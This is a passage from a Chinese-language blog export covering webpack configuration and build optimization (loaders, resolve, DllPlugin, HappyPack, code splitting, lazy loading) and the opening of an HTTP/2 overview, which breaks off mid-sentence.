‘’ 空字符串，即 webpack 构建出的资源默认使用相对路径。如果需要使用 CDN 加速，让客户端去 CDN 服务器加载资源，则需要更改 publicPath 的配置： 1publicPath: &apos;//cdn.example.com/assets/&apos; 这时发布到线上的代码地址为： 1&lt;script src=&quot;//cdn.example.com/assets/filename_[hash].js&quot;&gt;&lt;/script&gt; crossOriginLoadingoutput.crossOriginLoading 配置异步加载资源是否带 cookie: anonymous （默认）加载此脚本资源时不会带上用户的 cookie。 use-credentials 加载异步资源时带上用户的 cookie。 注意：这里只介绍了几个常用配置，详细请上官方文档查看。下文也类似。 Module module 配置如何处理不同类型的模块。 配置 Loaderrules 配置模块的读取和解析规则，通常用来配置 loader。类型为 array，描述了如何处理部分文件，配置规则如下： 条件配置：通过 test、include、exclude 三个配置项来命中需要 loader 处理的文件。 loader: 对命中的文件通过 use 配置来应用 loader，也可以给 loader 传递参数。 重置顺序：一组 loader 处理顺序默认是从右往左执行的，可以通过 enforce 选项让其中一个 loader 最前或最后 下面我们通过例子来说明一下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253module: &#123; rules: [ &#123; // 通过正则命中 js 文件 test: /\.js$/, // 使用 babel-loader 转换 js 文件 // ?cacheDirectory 表示给 babel-loader 传递参数，用于缓存 babel 编译结果加快重新编译速度 use: ['babel-loader?cacheDirectory'], // 只处理 src 中的 js 文件 include: path.resolve(__dirname, 'src') &#125; ]&#125;// 传递给 loader 的参数可以是 objectmodule: &#123; rules: [ &#123; // 通过正则命中 js 文件 test: /\.js$/, // 使用 babel-loader 转换 js 文件 // ?cacheDirectory 表示给 babel-loader 传递参数，用于缓存 babel 编译结果加快重新编译速度 use: [&#123; loader: 'babel-loader', options: &#123; cacheDirectory: true, &#125;, // enforce: 'post' 表示该 loader 执行顺序放到最后 // enforce: 'pre' 表示 loader 执行顺序放到最前面 enforce: 'post' &#125;], // 不处理 node_modules 中的 js 文件 exclude: path.resolve(__dirname, 'node_modules') &#125; ]&#125;// test | include | exclude 可以是数组module: &#123; rules: [ &#123; test: [/\.js$/, /\.ts$/], include: [ path.resolve(__dirname, 'pageOne'), path.resolve(__dirname, 'pageTwo') ], exclude: [ path.resolve(__dirname, 'node_modules'), path.resolve(__dirname, 'bower_modules') ] &#125; ]&#125; noParsenoParse 用于忽略没有采用模块化的文件的递归解析和处理。例如，jquery、ChartJS 等： 123456789// 正则匹配noParse: /jquery|chartjs/// webpack3.0 后支持函数noParse: (content) =&gt; &#123; // content 表示模块文件路径 // return true or false return /jquery|chartjs/.test(content)&#125; Resolve resolve 可以配置 webpack 如何去查找模块对应的文件。 aliasresolve.alias 配置通过别名，将原路径变为新路径： 1234567891011121314resolve: &#123; alias: &#123; // import .. from &apos;react-native&apos; 替换为 // import .. from &apos;react-native-web &apos;react-native&apos;: &apos;react-native-web&apos; &#125;&#125;// 可以通过 $ 缩小命中范围resolve: &#123; alias: &#123; &apos;react$&apos;: &apos;/path/to/react.min.js&apos; &#125;&#125; mainFields有些第三方模块会针对不同环境提供几分代码。例如，分别提供 es6 和 es5 2份代码： 1234&#123; &quot;jsnext:main&quot;: &quot;es/index.js&quot;, // 采用 es6 语法入口文件 &quot;main&quot;: &quot;lib/index.js&quot; // 采用 es5 语法入口文件&#125; webpack 会根据 mainFields 配置去决定优先采用那份文件，默认值为： 1mainFields: [&apos;browser&apos;, &apos;main&apos;] webpack 会根据数据里面的顺序去 package.json 文件里寻找，只会找到第一个。假如想采用 es6 的代码，应改配置为： 1mainFields: [&apos;jsnext:main&apos;, &apos;browser&apos;, &apos;main&apos;] extensions当导入的文件不带后缀时，webpack 会自动给文件匹配上后缀，然后查找文件是否存在，尝试后缀列表默认： 1extensions: [&apos;.js&apos;, &apos;.json&apos;] 若你的 react 应用使用的是 jsx 后缀，可改配置为： 1extensions: [&apos;.jsx&apos;, &apos;.js&apos;, &apos;.json&apos;] modules配置 webpack 去哪找第三方模块，默认只会在 node_modules 找。若你的项目中有大量类似 import ‘../../componens/button’ 这样的导入模块路径，可以这样配置： 1modules: [&apos;./src/components&apos;, &apos;node_modules&apos;] 然后通过 import ‘button’ 导入，提高开发效率。 Plugins plugin 用于扩展 webpack 的功能，社区有各种 plugin 几乎可以做任何构建相关的事情。 plugin 配置plugin 配置很简单，将 plugin 的实例传入 plugins 即可。plugin 需要的参数可以通过 构造函数传入： 12345678plugins: [ new webpack.optimize.UglifyJsPlugin(&#123; compress: &#123; wrarning: false, drop_console: false, &#125; &#125;)] DevServer 只有通过 DevServer 启动 webpack 时，devServer 选项才会生效，webpack 本身并不认识 devServer。 hotdevServer.hot 是否启用热模块替换功能。启用热模块替换后，将会在不刷新页面的情况下用新模块代替旧模块。 historyApiFallbackdevServer.historyApiFallback 用于使用了 HTML5 History API 的单页应用。这类应用要求服务器针对任何命中的路由都返回同一个 HTML 文件： 1historyApiFallback: true 若有多个单页应用： 1234567historyApiFallback: &#123; rewrites: [ &#123;from: /^\/user/, to: &apos;user.html&apos;&#125;, &#123;from: /^\/game/, to: &apos;game.html&apos;&#125;, &#123;from: /./, to: &apos;index.html&apos;&#125; ]&#125; httpsDevServer 默认使用 HTTP，但是当你使用 HTTP/2 和 Service Worker 必须使用 https: 123devServer: &#123; https: true&#125; opendevServer.open 配置是否在第一次启动时在默认浏览器上打开开发网页。 其他配置项 除了上面的配置项，webpack 还提供了一些零散的配置项。下面介绍几个常用的。 Targetjs 的应用场景越来越多，webpack 可以根据不同环境构建出不同的代码： target值 描述 web 针对浏览器（默认），所有代码集中在一个文件 node 针对 nodejs，使用 require 语句加载 chunk async-node 针对 nodejs，异步加载 chunk webworker 针对 webworker electron-main 针对 electron 主线程 electron-render 针对 electron 渲染线程 例如，当设置 target: ‘node’ 时，require(‘fs’) 就不会将 fs 模块导入 chunk，更详细的介绍请看另一篇文章：webpack之react同构应用。 Devtool配置 webpack 如何生成 Source Map，方便进行代码调试。默认值为 false，即不生成 Source Map，可以这样配置： 1devtool: &apos;source-map&apos; extenalsextenals 告诉 webpack 哪些模块不用被打包进去，而是由外部环境提供，例如，当 html 文件中有： 1&lt;script src=&quot;/path/to/jquery.js&quot;&gt;&lt;/script&gt; 可以这样配置，防止页面加载两份 jquery 文件（url 一份，打包一份）： 1234externals: &#123; // 把导入语句里的 jquery 替换成运行环境的全局变量 jQuery jquery: &apos;jQuery&apos;&#125; 导出多种配置 通常需要从一份源码中构建出多份代码（开发环境、线上环境）等，但是之间的配置又很相似，如果写两份配置文件，则需要维护两份配置文件，工作量大，还容易出错，这时可以导出一个 Function，通过一个配置文件完成要求： 12345678910111213141516171819202122const path = require('path');const UglifyJsPlugin = require('webpack/lib/optimize/UglifyJsPlugin');module.exports = function (env = &#123;&#125;, argv) &#123; const plugins = []; const isProduction = env['production']; // 在生成环境才压缩 if (isProduction) &#123; plugins.push( // 压缩输出的 JS 代码 new UglifyJsPlugin() ) &#125; return &#123; plugins: plugins, // 在生成环境不输出 Source Map devtool: isProduction ? undefined : 'source-map', &#125;;&#125; 参考链接 深入浅出 webpack： http://webpack.wuhaolin.cn/ webpack 中文官网： https://doc.webpack-china.org/configuration/]]></content>
      <categories>
        <category>webpack</category>
      </categories>
      <tags>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webpack之优化]]></title>
    <url>%2Fwebpack%E4%B9%8B%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[在上篇 webpack 之基础配置讲解了 webpack 的一些基本用法，本篇我们来详细分析下 webpack 性能相关优化。 webpack 的优化可分为两大类： 优化开发体验：提高构建速度、热替换和自动刷新。 优化输出质量：压缩、CDN 加速、使用 Tree Shaking、提取公共代码、按需加载等。 优化开发体验 缩小文件搜索范围webpack 启动后会从 entry 出发递归解析和处理 module。处理 module 的时候涉及查找 module 对应的文件和 module 解析两个步骤。当项目比较大的时候，查找和解析 module 可能会造成构建缓慢。因此我们可以从这个点出发，进行优化。 优化 Loader 配置由于 loader 转换耗时，因此应尽可能减少不必要的 loader 转换，可以通过 test、include、exclude 等缩小命中范围： 123456789101112const config = &#123; module: &#123; rules: [ &#123; test: /\.js$/, use: ['babel-loader?cacheDirectory'], // 只处理 src 目录下的文件 include: path.resovle(__dirname, 'src') &#125; ] &#125;&#125; 优化 resolve.modules 配置默认第三方模块在当前目录下的 node_modules 目录下查找，找不到再 往上 ../node_modules，再不到再往上 ../../node_modules。 当我们所需要的第三方模块都在当前目录下的 node_modules 时，可以使用绝对路径。减少搜索时间： 12345const config = &#123; resolve: &#123; modules: [path.resolve(__dirname, 'node_modules')] &#125;&#125; 优化 module.noParse 配置没有采用模块化的文件，没必要经过 webpack 的处理，例如: jQuery、ChartJS。 12345const config = &#123; module: &#123; noParse: [/chartjs/], &#125;&#125; 使用 DllPlugin使用过 window 系统的人，应该经常看到 .dll 后缀的文件，这些文件成为动态链接库，在一个动态链接库中可以包含给其他模块调用的函数和数据。 webpack 可以利用 DllPlugin 将常用的第三方库打包进动态链接库中，例如：react、react-dom，只要不升级这些模块，动态链接库就不用重新编译，从而大量缩短编译时间。 接入 wepackwebpack 已经内置了对动态链接库的支持，需要通过两个内置的插件接入： DllPlugin： 用于打包动态链接库文件。 DllReferencePlugin: 用于在主配置文件中引入 DllPlugin 打包好的动态链接库文件。 为了方便说明，我用 webpack 简单构建了 react 和 react-dom 合成的动态链接库文件，输出目录如下： 123/dist |-- react.dll.js |-- react.manifest.json react.dll.js 的内容大致如下： 1234567891011var _dll_react = (function(modules) &#123; // ... 此处省略 webpackBoostrap 函数代码&#125;([ function(module, exports, __webpack_require__) &#123; // 模块 ID 为 0 的模块对应的代码 &#125;， function(module, exports, __webpack_require__) &#123; // 模块 ID 为 1 的模块对应的代码 &#125;， // ... 省略其他模块对应的代码])); 可以一个动态链接库文件中可以包含大量模块，模块以数组索引最为 ID，并且通过 _dll_react 变量将自己暴露在全局中。 react.manifest.json 也是由 DllPlugin 生成的，用于描述动态链接库中包含哪些模块： 12345678910111213141516171819202122232425262728&#123; // 描述该动态链接库文件暴露在全局的变量名称 "name": "_dll_react", "content": &#123; "./node_modules/process/browser.js": &#123; "id": 0, "meta": &#123;&#125; &#125;, // ... 此处省略部分模块 "./node_modules/react-dom/lib/ReactBrowserEventEmitter.js": &#123; "id": 42, "meta": &#123;&#125; &#125;, "./node_modules/react/lib/lowPriorityWarning.js": &#123; "id": 47, "meta": &#123;&#125; &#125;, // ... 此处省略部分模块 "./node_modules/react-dom/lib/SyntheticTouchEvent.js": &#123; "id": 210, "meta": &#123;&#125; &#125;, "./node_modules/react-dom/lib/SyntheticTransitionEvent.js": &#123; "id": 211, "meta": &#123;&#125; &#125;, &#125;&#125; 可见 manifest.json 文件清楚的描述对应的 dll 文件包含哪些模块，以及这些模块的 ID。对应的 html 为： 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;title&gt;Page Title&lt;/title&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt;&lt;/div&gt; &lt;!--导入依赖的动态链接库文件--&gt; &lt;script src="./dist/react.dll.js"&gt;&lt;/script&gt; &lt;!--导入执行入口文件--&gt; &lt;script src="./dist/bundle.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 构建动态链接库新建一个 webpack_dll.config.js 文件构建动态链接库： 123456789101112131415161718192021222324const path = require('path');const DllPlugin = require('webpack/lib/DllPlugin');module.exports = &#123; entry: &#123; react: ['react', 'react-dom'] &#125;, output: &#123; filename: '[name].dll.js', path: path.resolve(__dirname, 'dist'), // 存放动态链接库全局变量的名称，对 react 来说是 _dll_react // 加上 _dll_ 是为了防止命名冲突 library: '_dll_[name]', &#125;, plugins: [ new DllPlugin(&#123; // 动态链接库的名称，需要和 library 保持一致 // 该字段的值也就是输出的 manifest.json 文件中 name 的值 name: '_dll_[name]', // 描述动态链接库的 manifest.json 文件输出时的文件名 path: path.resolve(__dirname, 'dist', '[name].manifest.json') &#125;) ]&#125; 使用动态链接库12345678910111213141516171819202122232425262728293031323334const path = require('path');const ExtractTextPlugin = require('extract-text-webpack-plugin');const DllReferencePlugin = require('webpack/lib/DllReferencePlugin')module.exports = &#123; entry: './main.js', output: &#123; filename: 'bundle.js', path: path.resolve(__dirname, './dist'), &#125;, module: &#123; rules: [ &#123; test: /\.css$/, use: ExtractTextPlugin.extract(&#123; use: ['css-loader'], &#125;) &#125;, &#123; test: /\.js/, use: ['babel-loader'], exclude: path.resolve(__dirname, 'node_modules') &#125;] &#125;, plugins: [ // 告诉 webpack 使用了哪些动态链接库 new DllReferencePlugin(&#123; // 描述 react 动态链接库的文件内容 manifest: require('./dist/react.manifest.json'), &#125;), new ExtractTextPlugin(&#123; filename: '[name]_[contenthash:8].css', &#125;), ]&#125; 使用 HappyPackwebpack 以单线程模式运行在 nodejs 之上，当项目大，需要处理大量文件的时候，不能充分利用 CPU 的性能。 HappyPack 可以解决这个问题，它把任务分给多个子进程去并发执行，子进程处理完后再把结果返回给主进程。 接入 HappyPack分解任务和进程管理 HappyPack 都会自动完成，你所需要做的只是接入 HappyPack： 12345678910111213141516171819202122232425262728293031323334353637const path = require('path');const ExtractTextPlugin = require('extract-text-webpack-plugin');const HappyPack = require('happypack');const config = &#123; module: &#123; rules: [ &#123; test: /\.js$/, // 将 js 文件交给 id 为 babel 的 HappyPack 进程处理 use: ['happypack/loader?id=babel'], exclude: path.resolve(__dirname, 'node_modules') &#125;, &#123; test: /\.css$/, use: ExtractTextPlugin.extract(&#123; // 将 css 文件交个 id 为 css 的 HappyPack 进程处理 use: ['happypack/loader?id=css'] &#125;) &#125; ] &#125;, plugins: [ new HappyPack(&#123; // 标识 HappyPack 进程 id: 'babel', // 如何处理 .js 文件，用法和 loader 配置一样 loaders: ['babel-loader?cacheDirectory'] &#125;), new HappyPack(&#123; id: 'css', loaders: ['css-loader'] &#125;), new ExtractTextPlugin(&#123; filename: '[name].css' &#125;) ]&#125; 除了支持 id 和 loaders，HappyPack 还支持如下参数： threads: 代表开几个进程去处理这一类文件，默认是 3 个，类型必须是整数。 verbose: 是否允许 HappyPack 输出日志，默认 true。 threadPool: 代表共享进程池，即多个 HappyPack 实例都使用同一个共享进程池中的子进程处理任务，以防止资源占用过多。 进程池的创建： 1const happyThreadPool = HappyPack.ThreadPool(&#123;size: 5&#125;) 使用 ParallelUglifyPlugin在构建线上代码的时候，需要对代码进行压缩，会发现这个过程相比开发环境慢很多。因为压缩 js 代码需要先把代码解析成用 Object 抽象表示的 AST 语法树，再去应用各种规则分析和处理 AST，导致这个过程计算量巨大，耗时非常多。 使用 parallelUglifyPlugin 可以开启多个进程进行并行压缩，加快构建过程： 123456789101112131415161718192021222324252627282930const path = require('path');const DefinePlugin = require('webpack/lib/DefindePlugin');const ParallelUglifyPlugin = require('webpack-parallel-uglify-plugin');module.exports = &#123; plugins: [ // 使用 ParallelUglifyPlugin 并行压缩 js 代码 new ParalleUglifyPlugin(&#123; // 传递给 UglifyJS 的参数 uglifyJS: &#123; output: &#123; // 最紧凑输出 beautify: false, // 删除所有注释 comments: false, &#125;, compress: &#123; // 在 UglifyJS 删除没有用到的代码时不输出警告 warnings: false, // 删除所有的 console 语句，兼容 ie drop_console: true, // 内嵌定义了但只用到一次的变量 collapse_vars: true, // 提取出出现多次但是没有定义成变量去引用的静态值 reduce_vars: true, &#125; &#125; &#125;) ]&#125; ParallelUglifyPlugin 支持以下参数： test：使用正则去匹配需要压缩哪些文件，默认是 /\.js$/。 include: 使用正则去命中需要被压缩的文件，默认 []。 exclude: 使用正则去命中不需要被压缩的文件，默认 []。 cacheDir: 缓存压缩后的结果，默认不缓存，若需要缓存请设置一个目录路径。 workerCount: 开启几个进程去执行压缩，默认当前 CPU 核数减一。 sourceMap: 是否输出 Source Map，这会导致压缩过程变慢。 uglifyJS：用于压缩 es5 代码时的配置，Object 类型，直接传递给 UglifyJS 的参数。 uglifyES：用于压缩 es6 代码时的配置，Object 类型，直接传递给 UglifyES 的参数。 其中 test、include、exclude 与配置 loader 时的思想和用法一样。 UglifyES 是 UglifyJS 的变种，专门用于压缩 es6 代码，它们两都出自于同一项目，但不能同时使用。 UglifyES 一般用于给比较新的 js 运行环境压缩代码，例如 react-native，为了能得到更好的性能和尺寸，采用 UglifyES 压缩效果更好。 ParallelUglifyPlugin 同时内置了 UglifyES 和 UglishJS。 注意：webpack4.0 UglifyJS 在 production 模式时，UglifyJS 自动并行编译和缓存， 这意味着 当你使用 &gt;= webpack4.0 的版本时不在需要使用 ParallelUglifyPlugin， 官方说明到 webpack5.0 的时候将会完全实现缓存和并行化，期待 自动刷新为了优化开发体验，webpack 内置了监听文件的变化去刷新浏览器的功能： 123456789101112131415module.export = &#123; // 只有开启监听模式，watchOptions 才有意义 // 默认为 false watch: true, watchOptions: &#123; // 不监听文件或文件夹，默认为 '' ignored: /node_modules/, // 监听到文件变化后，等 300ms 再去执行操作 // 防止文件更新太快，重编译频率太高 aggregateTimeout: 300, // 不停的去询问系统文件是否发生变化 // 默认每秒问 1000 次 poll: 1000, &#125;&#125; 文件监听实现的原理为，记录最后一次文件的编译时间与文件的最后一次保存时间对比，若不相同，在等待 aggregateTimeout 后对文件进行重新编译。 webpack 官方提供了两大模块，一个是核心 webpack 一个是 webpack-dev-server 如果要开启自动刷新功能，需要用 webpack-dev-server 启动 webpack 构建，而 webpack-dev-server 默认开启 watch。 开启模块热替换模块热替换可在不刷新整个网页的情况下做到超灵敏的实时预览。原理是当一个模块发生变化时，只重新编译发生变化的模块，再用新模块替换浏览器中老的模块。 在启动 webpack 构建时 带上 —hot 参数即可启动模块热替换 优化模块热启动在发生模块热替换时，浏览器的日志显示的是替换模块的 ID，对人类很不友好。 从上图可以看到，模块热替换默认显示的是模块 ID 1。上图也有提示： Consider using the Name ModulesPlugin for module names 我们来优化一下： 123456const NamedModulesPlugin = requjre('webpack/lib/NamedModulesPlugin');module.exports = &#123; plugins: [ new NamedModulesPlugin(), ]&#125; 可以看到模块 ID 就变成模块名称了。 注意：webpack4 在 开发模式下，默认启用了 NamedModulesPlugin，不需要再手动设置 优化输出质量 区分环境开发网页的时候，一般会有多套运行代码，例如： 开发环境代码，包含日志输出，代码美化方便调试 发布线上代码，移除日志输出，代码压缩，提高代码运行效率 很多第三方库的代码也做了环境区分，例如：react: 123if (process.env.NODe_ENV !== 'production') &#123; waring(...)&#125; 这时可以通过 webpack 设置打包环境，优化代码输出质量： 1234567891011const DefinePlugin = require('webpack/lib/DefinePlugin');module.exports = &#123; plugins: [ new DefinePlugin(&#123; 'process.env': &#123; NODE_ENV: JSON.stringify('production'), &#125; &#125;) ]&#125; 经过构建后代码变成： 123if (false) &#123; waring(...)&#125; if 语句得不到执行，再经过 UglifyJS 压缩，即可删除这段无效代码，即可以提高代码运行速度，又可以减小总体代码体积。 压缩代码为什么要进行代码压缩因为进行代码压缩可以减小文件体积，减少网络传输流量。对于代码文件还有混淆代码的作用，并且压缩了代码变量名名称，有利于保护代码安全。 压缩 js 上文有介绍，这里就不赘述，我们来看看 css 压缩、svg 压缩。 css 压缩css 代码也可以像 js 那样压缩，对代码进行混淆，目前比较成熟的工具是 cssnano，基于 PostCSS。 cssnano 能理解 css 代码含义，而不仅仅是删除空格，例如： margin: 10px 20px 10px 20px 被压缩成 margin: 10px 20px; color: #ff0000 被压缩成 color: red; webpack 使用 cssnano 很简单，只需要开启 css-loader 的 minimize 选项： 12345678910module.exports = &#123; module: &#123; rules: [ &#123; test: /\.css$/, use: ['css-loader?minimize'] &#125; ] &#125;&#125; svg 压缩目前 svg 已经成为客户端应用小图标的首先技术方案，相对于位图更清晰，多数情况下体积更小。 使用 sag-inline-loader 会分析 svg 内容，去除不必要的内容，例如： 1234&lt;svg class=&quot;icon&quot; verison=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;24&quot; height=&quot;24&quot; viewBox=&quot;0 0 24 24&quot; stroke=&quot;#000&quot;&gt; &lt;circle cx=&quot;12&quot; cy=&quot;12&quot; r=&quot;10&quot;/&gt;&lt;/svg&gt; 被处理后： 1&lt;svg viewBox=&quot;0 0 24 24&quot; stroke=&quot;#000&quot;&gt;&lt;circle cx=&quot;12&quot; cy=&quot;12&quot; r=&quot;10&quot;/&gt;&lt;/svg&gt; sag-inline-loader 用法： 12345678910module.exports = &#123; module: &#123; rules: [ &#123; test: /\.svg/, use: [&apos;use-inline-loader&apos;] &#125; ] &#125;&#125; 使用 Tree Shaking什么是 Tree ShakingTree Shaking 可以用来剔除 javascript 中用不上的死代码，依赖于 es6 模块化语法。 例如：utils.js源码： 1234567export function funcOne() &#123; console.log('one');&#125;export function funcTwo() &#123; console.log('two');&#125; 当我们的代码只引用了 funcOne: 123import &#123;funcTwo&#125; from './utils';// do something ... Tree Shaking 后的 utils.js: 123export function funcOne() &#123; console.log('one');&#125; 注意：Tree Shaking 正常工作的前提是交给 webpack 的 js 代码必须是 es6 模块语法的，因为 es6 模块语法是静态的，这让 webpack 可以简单分析出哪些 export 的被 import 过了。如果采用 es5 中的模块，例如：module.exports = {…}, require(…)，webpack 无法分析出哪些代码可以被剔除。 接入 Tree Shaking把 es6 模块化的代码交给 webpack，修改 .babelrc 如下： 12345678910&#123; "presets": [ [ "env", &#123; "modules": false &#125; ] ]&#125; 其中 “modules”: false 含义是关闭 babel 模块转换功能，保留原本 es6 模块化语法。 配置好后，重新运行 webpack 带上 —display-used-exports 参数，方便追踪 Tree Shaking 工作。 上述工作只是标识出可以剔除的代码，真正剔除的工作还得交给 UglifyJS，启动 webpack 时带上 —optimize-minimize 参数即可实现剔除。 很多第三方库也提供了 es6 模块化的入口： 1234&#123; "main": "lib/index.js", // 指明采用 CommanJS 模块化的代码入口 "jsnext:main: "es/index.js", // 指明采用 es6 模块化的代码入口&#125; webpack 添加如下配置，也可让 Tree Shaking 对第三方库生效： 12345module.exports = &#123; resolve: &#123; mainFields: ['jsnext:main', 'browser', 'main'] &#125;&#125; 提取公共代码为什么要提取公共代码提供公共代码有两个方面的优势： 提取多个页面的公共代码，虽然用户第一次访问没有优势，当时当用户访问其他页面的时候，因为本地有缓存，页面加载速度将大大加快。 提取第三方库，因为第三方库代码更改频率低，可以充分利用浏览器缓存。 使用 &gt;= webpack4.x 的版本时，webpack 会自动处理代码分割，无需手动处理。但是如果我们开发大型项目，还是有必要手动处理公共代码的。 注意， webpack4.0 已经将 CommonsChunkPlugin 移除，取而代之的是更好的默认公共代码提取方式，以及拥有更丰富更灵活的功能的 optimization.splitChunks 和 optimization.runtimeChunk。 提取大型项目公共代码的原则 根据项目应用的技术栈，提取所有页面都需要的基础库。例如 react 的技术栈，可以提取 react、react-dom 为一个单独的文件。（具体情况需要具体分析，可能技术栈中使用了 appolo-client 也需要把 appolo-client 放入基础库）这个文件一般命名为 base_[hash:8].js。 在剔除了公共代码库后，将各个页面公用的代码提取入 common_[hash:8].js，若是 css 可提取进 common_[hash:8].css。 每个页面生成一份单独的 js、css 文件。（在此基础上按需实现懒加载） 借用 吴浩麟大神的图片 下面我们来看看如何用 optimization.splitChunks 和 optimization.runtimeChunk 实现上叙需求。 1234567891011121314151617181920212223242526272829module.exports = &#123; optimization: &#123; splitChunks: &#123; chunks: 'async', // chunks 类型 (initial | all | async) minSize: 30000, // 最小尺寸, 默认 30000 minChunks: 1, // 最少 chunk, 默认 1 maxAsyncRequests: 5, // 最大异步请求 chunk 数 maxInitalRequests: 3, // 最大初始化请求 chunk 数 cacheGroups: &#123; default: &#123; minChunks: 2, priority: -20, // 优先级 &#125;, // 提取各个页面的公共代码（不包括第三方库） commons: &#123; name: 'commons', chunks: 'initial', &#125;, // 提取各个页面公共的第三方库 vendors: &#123; name: 'base', chunks: 'initial', test: /node_modules/, priority: -10, &#125; &#125; &#125; &#125;&#125; 按需加载随着 SPA 的广泛流行，面临着一个网页需要加载全网站代码的问题，这会导致初次进入页面，页面加载缓慢、交互卡顿，用户体验糟糕。 针对这个问题的优化原则： 把整个网站拆分成一个个小功能，在按照功能的相关性分成几个类 把每一个类合并为一个 chunk，按需加在对应的 chunk 对于用户首次打开网页时需要用到的功能，不需要做按需加载，而是放到执行入口所在的 chunk 中，降低用户感知时间。 对于依赖大量代码的功能，例如：chartjs，可对此再按需加载。（若是在首页，则可对这部分代码进行异步加载） webpack 实现按需加载1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import &#123; PureComponent, createElement &#125; from 'react';import &#123; render &#125; from 'react-dom';import &#123; HashRouter, Route, Link &#125; from 'react-router-dom';import Home from './Home';function getAsyncComponent(load) &#123; return class AsyncComponent extends PureComponent &#123; componentDidMount() &#123; // 在高阶组件 DidMount 后在去异步加载 组件 load().then((&#123; default: component &#125;) =&gt; &#123; // 组件加载成功，通知高阶组件重新渲染子组件 this.setState(&#123; component, &#125;) &#125;) &#125; render() &#123; const &#123; component &#125; = this.state || &#123;&#125;; // component 是 React.Component 类型 // 需要通过 createElement 产生一个组件实例 return component ? createElement(component) : null; &#125; &#125;&#125;function App() &#123; return ( &lt;HashRouter&gt; &lt;div&gt; &lt;nav&gt; &lt;Link to="/"&gt;Home&lt;/Link&gt; | &lt;Link to="/about"&gt;Home&lt;/Link&gt; &lt;/nav&gt; &lt;hr /&gt; &lt;Route exact path="/" component=&#123;Home&#125; /&gt; &lt;Route path="/about" component=&#123;getAsyncComponent( // webpack 内置了对 import 的支持 () =&gt; import(/* webpackChunkName: 'about' */'./pages/about') )&#125; /&gt; &lt;Route path="login" component=&#123;getAsyncComponent( () =&gt; import(/* webpackChunkName: 'login' */'./pages/login') )&#125; /&gt; &lt;/div&gt; &lt;/HashRouter&gt; );&#125;render(App, document.getElementById('app')) 上叙代码的关键在于 import(/ webpackChunkName: ‘about’ /‘./pages/about’) webpack 内置了对 import(*) 语句的支持，当webpack 遇到这样的语句： 以 ./pages/about 为入口新生成一个 Chunk; 当代码执行到 import 所在语句时才会去加载由 Chunk 对应生成的文件； import 返回一个 promise，文件加载成功时调用 resolve 注意：不支持 Promise 的浏览器需要手动注入 promise polyfill 上述代码直接打包会报错，因为 Babel 不认识 import(*) ，为此我们需要安装一次插件 babel-plugin-syntax-dynamic-import，.babelrc 改为 123456789&#123; "presets": [ "env", "react" ], "plugins": [ "syntax-dynamic-import" ]&#125; 参考链接 深入浅出 webpack： http://webpack.wuhaolin.cn/ webpack 中文官网： https://doc.webpack-china.org/configuration/]]></content>
      <categories>
        <category>webpack</category>
      </categories>
      <tags>
        <tag>webpack</tag>
        <tag>优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解 http/2]]></title>
    <url>%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20http2%2F</url>
    <content type="text"><![CDATA[以下内容摘自 HTTP/2 简介 ，要了解更多请移步 《Web 性能权威指南》（O’Reilly，作者：llya Grigorik） 近来 HTTP/2 的声音不断在国内各个技术论坛响起，说什么 HTTP/2 可以带来多少多少性能提升，到底是如何实现的呢？我们一起来分析一下。 HTTP/2 主要特性在如下三个方面： 通过支持完整的请求与响应复用来减少延迟 通过有效压缩 HTTP 标头字段，将协议开销降至最低 增加请求优先级和服务器推送的支持 注：以上机制虽然不是全部，却是最重要的。 说到这里，各位看官是不是已经遥想到当年升级 HTTPS的苦逼经历了？ 不必担心，HTTP/2 没有改动 HTTP 的应用语义。HTTP 方法、状态代码、URI 和标头字段等核心概念一如往常。不过，HTTP/2 修改数据格式化（分帧）以及客户端和服务器之间的传输方式。这两点统帅全局。通过新的分帧层，向我们的应用隐藏了所有的复杂性。因此所有现有应用都可以不必修改而在新协议下运行。 除非您在实现网络服务器（或自定义客户端），需要使用原始的 TCP 套接字，否则你可能注意不到任何区别：所有新的低级分帧由客户端和服务器为您完成。可观察到的唯一区别将是性能的提升和请求优先级、流控制和服务器推送等新功能的出现。 是不是很爽？😊 人家带给你这么多好处，总得知道下人家来自哪里吧？礼尚往来嘛，请看 SPDY 与 HTTP/2 简史 SPDY 是 Google 开发的一个实验性协议，于 2009 年年中发布，其主要目标是通过解决 HTTP/1.1 中广为人知的一些性能限制来减少网页的加载延迟。具体来说，这个项目设定的目标如下： 页面加载时间（PLT）减少 50% 无需网页作者改任何内容 将部署复杂性降至最低，无需更改网络基础设施 与开源社区合作开发这个新协议 收集真实数据，验证这个实验性协议是否有效 注：为了达到减少 50% 页面加载时间的目标，SPDY 引入了一个新的二进制分帧层，以实现请求和响应复用、优先级和标头压缩，目的是更有效的利用底层 TCP 连接。TCP 的三次握手和慢启动等带来的延时性能问题，请参阅延迟是性能瓶颈 首次发布后不久，Google 两位软件工程师 Mike Belshe 和 Roberto Peon 就分享了他们对这个实验性 SPDY 协议的实现结果、文档和源代码。 目前为止，我们只在实验条件下测试过 SPDY 。&gt; 最初的结果很激动人心：通过模拟的家庭网络连接下载了 25 个最流行的网站之后，我们发现性能提升特别明显，页面加载速度最高加快了 55% ，（Chromium 博客） 几年后的 2012 年，这个新的协议得到了 Chrome、Firefox、Opera 的支持，越来越多的大型网站（如 Google、Twitter、Facebook）和小型网站开始在其基础设施内部署 SPDY。事实上，在被行业越来越多的采用之后，SPDY 已经具备了成为标准的条件。 观察到这一趋势后，HTTP 工作组（HTTP-WG）将这一工作提上议事日程，吸取 SPDY 的经验教训，并在此基础上定制了官方“HTTP/2”标准。在拟定宣言草案、向社会征集 HTTP/2 建议并经过内部讨论之后，HTTP-WG 决定将 SPDY 规范作为新 HTTP/2 协议的基础。 接下来几年中 SPDY 和 HTTP/2 持续共同进化，SPDY 作为实验性分支，用于为 HTTP/2 